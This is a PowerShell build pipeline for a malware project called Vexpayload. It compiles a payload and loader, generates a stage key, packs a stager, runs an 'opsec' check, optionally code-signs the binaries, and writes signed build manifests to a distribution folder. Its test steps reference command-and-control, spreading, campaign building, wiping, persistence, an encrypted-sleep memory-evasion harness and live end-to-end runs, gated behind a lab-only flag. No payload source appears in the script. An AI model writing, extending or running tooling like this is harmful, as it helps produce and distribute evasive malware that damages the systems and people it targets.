# Vexpayload build pipeline: payload -> loader -> packed stager -> dist.
# Fails loudly if any step fails or if the deployable is older than the source.
param(
    [string]$Configuration = "Release",
    [string]$Platform = "x64",
    [switch]$Test,
    [switch]$ForceTls,
    [switch]$Sign,
    [string]$Pfx = "",
    [switch]$LabTests,
    [switch]$MemTests
)

$ErrorActionPreference = "Stop"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$MSBuild = "D:\VisualStudio2022\MSBuild\Current\Bin\amd64\MSBuild.exe"
if (-not (Test-Path $MSBuild)) { throw "MSBuild not found at $MSBuild" }

function Step($name, [scriptblock]$body) {
    Write-Host "==> $name" -ForegroundColor Cyan
    & $body
    if ($LASTEXITCODE -ne 0) { throw "$name failed (exit $LASTEXITCODE)" }
}

$payloadSrc = Join-Path $Root "Vexpayload.cpp"
$payloadExe = Join-Path $Root "$Platform\$Configuration\Vexpayload.exe"
$loaderExe = Join-Path $Root "loader\$Platform\$Configuration\xloader.exe"
$stager = Join-Path $Root "$Platform\$Configuration\stager.exe"
$dist = Join-Path $Root "dist"

$before = Get-Date
$defs = @()
if ($ForceTls) { $defs += "/p:VexForceTls=true" }

# Per-build stage key: the loader and packer must share it; never the public
# constant that used to live in both files.
$stageKey = New-Object byte[] 32
([Security.Cryptography.RandomNumberGenerator]::Create()).GetBytes($stageKey)
$stageHex = ($stageKey | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
$stageHeader = @"
#pragma once
#include <cstdint>
static const uint8_t kStageKey[32] = { $stageHex };
"@
Set-Content -Path (Join-Path $Root "loader\stage_key.h") -Value $stageHeader -Encoding ascii
Write-Host "==> stage key generated (loader/stage_key.h)" -ForegroundColor Cyan

New-Item -ItemType Directory -Force -Path $dist | Out-Null

Step "payload" { & $MSBuild (Join-Path $Root "Vexpayload.vcxproj") /p:Configuration=$Configuration /p:Platform=$Platform /m /v:m /nologo @defs }
Step "loader"  { & $MSBuild (Join-Path $Root "loader\xloader.vcxproj") /p:Configuration=$Configuration /p:Platform=$Platform /m /v:m /nologo }
if ($Sign) {
    if (-not $Pfx) { throw "-Sign requires -Pfx <certificate.pfx>" }
    Step "sign" { & (Join-Path $Root "tools\sign.ps1") -Pfx $Pfx }
}
Step "pack"    { python (Join-Path $Root "tools\pack.py") $loaderExe $payloadExe $stager (Join-Path $dist "stage.bin") }
Step "opsec"   { python (Join-Path $Root "tools\opsec_check.py") }
New-Item -ItemType Directory -Force -Path $dist | Out-Null
Copy-Item $stager (Join-Path $dist "stager.exe") -Force
Copy-Item $payloadExe (Join-Path $dist "Vexpayload.exe") -Force

# Staleness gate: every build input must predate the packed stager.
$newestSrc = Get-ChildItem $Root -Recurse -File -Include *.cpp,*.h,*.vcxproj,*.py,*.ps1 |
    Where-Object { $_.FullName -notmatch '\\(obj|x64|\.vs|__pycache__)\\' } |
    Sort-Object LastWriteTime -Descending | Select-Object -First 1
if (-not $newestSrc) { throw "no source files found for freshness gate" }
$stagerTime = (Get-Item $stager).LastWriteTime
if ($stagerTime -lt $newestSrc.LastWriteTime) {
    throw "stale stager: packaged $stagerTime but source is $($newestSrc.LastWriteTime)"
}

$sha = (Get-FileHash $stager -Algorithm SHA256).Hash
$payloadHash = (Get-FileHash $payloadExe -Algorithm SHA256).Hash
$loaderHash = (Get-FileHash $loaderExe -Algorithm SHA256).Hash
$signer = [ordered]@{}
foreach ($pair in @(@('payload', $payloadExe), @('loader', $loaderExe))) {
    $sig = Get-AuthenticodeSignature $pair[1]
    $signer[$pair[0]] = [ordered]@{
        status = "$($sig.Status)"
        subject = if ($sig.SignerCertificate) { $sig.SignerCertificate.Subject } else { "" }
        thumbprint = if ($sig.SignerCertificate) { $sig.SignerCertificate.Thumbprint } else { "" }
    }
}
$manifest = [ordered]@{
    schema = 1
    build_utc = (Get-Date).ToUniversalTime().ToString("o")
    payload = [ordered]@{ size = (Get-Item $payloadExe).Length; sha256 = $payloadHash }
    loader = [ordered]@{ size = (Get-Item $loaderExe).Length; sha256 = $loaderHash }
    stager = [ordered]@{ size = (Get-Item $stager).Length; sha256 = $sha }
    signer = $signer
}
$manifestPath = Join-Path $dist "BUILD_MANIFEST.json"
$manifestJson = $manifest | ConvertTo-Json -Depth 6
[IO.File]::WriteAllText($manifestPath, $manifestJson, [Text.UTF8Encoding]::new($false))
if ($env:VEX_MANIFEST_KEY) {
    $hmac = [Security.Cryptography.HMACSHA256]::new(
        [Text.Encoding]::UTF8.GetBytes($env:VEX_MANIFEST_KEY))
    $digest = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($manifestJson))
    [IO.File]::WriteAllText($manifestPath + ".sig",
        (($digest | ForEach-Object { $_.ToString("x2") }) -join "") + "`n",
        [Text.UTF8Encoding]::new($false))
}
if ($Sign) {
    foreach ($pair in @(@('payload', $payloadExe), @('loader', $loaderExe))) {
        $sig = Get-AuthenticodeSignature $pair[1]
        if ($sig.Status -ne 'Valid') {
            throw "signed build is not valid: $($pair[0]) $($sig.Status)"
        }
    }
}
$version = @"
build:      $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
source:     $($newestSrc.Name) @ $($newestSrc.LastWriteTime)
payload:    $((Get-Item $payloadExe).Length) bytes  sha256 $((Get-FileHash $payloadExe -Algorithm SHA256).Hash.Substring(0,16))
loader:     $((Get-Item $loaderExe).Length) bytes
stager:     $((Get-Item $stager).Length) bytes  sha256 $sha
"@
$version | Set-Content (Join-Path $dist "BUILD.txt") -Encoding UTF8
Write-Host $version -ForegroundColor Green
Step "manifest verify" { python (Join-Path $Root "tools\verify_manifest.py") }

if ($Test) {
    # Safe suites only: nothing here executes the compiled payload.
    Step "c2 selftest" { python (Join-Path $Root "tools\c2_selftest.py") | Out-Null }
    Step "decrypter selftest" { python (Join-Path $Root "tools\decrypter_selftest.py") | Out-Null }
    Step "fuzz container" { python (Join-Path $Root "tools\fuzz_container.py") --iterations 300 | Out-Null }
    Step "spread package verify" { python (Join-Path $Root "tools\verify_spread.py") | Out-Null }
    Step "harness guard" { python (Join-Path $Root "tools\guard_selftest.py") | Out-Null }
    Step "campaign builder" { python (Join-Path $Root "tools\campaign_selftest.py") | Out-Null }
    Write-Host "==> tests green (payload not executed)" -ForegroundColor Green
}

if ($MemTests) {
    # Dormant-memory proof: executes the payload's --sleep-crypt harness.
    if ($env:VEX_ALLOW_PAYLOAD -ne "1") {
        throw "refusing to run memory tests: set VEX_ALLOW_PAYLOAD=1 (lab/VM only)"
    }
    Step "dormant memory" { python (Join-Path $Root "tools\sleep_selftest.py") | Out-Null }
    Write-Host "==> memory tests green" -ForegroundColor Green
}

if ($LabTests) {
    # Payload-executing tests are lab-only. Explicit opt-in required.
    if ($env:VEX_ALLOW_PAYLOAD -ne "1") {
        throw "refusing to run payload tests: set VEX_ALLOW_PAYLOAD=1 (lab/VM only)"
    }
    Step "loader selftest" { & $stager --selftest --no-elevate }
    Step "stage selftest" { python (Join-Path $Root "tools\stage_selftest.py") | Out-Null }
    Step "state selftest" { python (Join-Path $Root "tools\state_selftest.py") | Out-Null }
    Step "wipe selftest" { python (Join-Path $Root "tools\wipe_selftest.py") | Out-Null }
    Step "persist preview" { python (Join-Path $Root "tools\persist_selftest.py") | Out-Null }
    Step "recovery drill" { python (Join-Path $Root "tools\recovery_selftest.py") | Out-Null }
    Step "live e2e" { python (Join-Path $Root "tools\e2e_live.py") | Out-Null }
    Write-Host "==> lab tests green" -ForegroundColor Green
}

Write-Host "==> done: $stager" -ForegroundColor Green
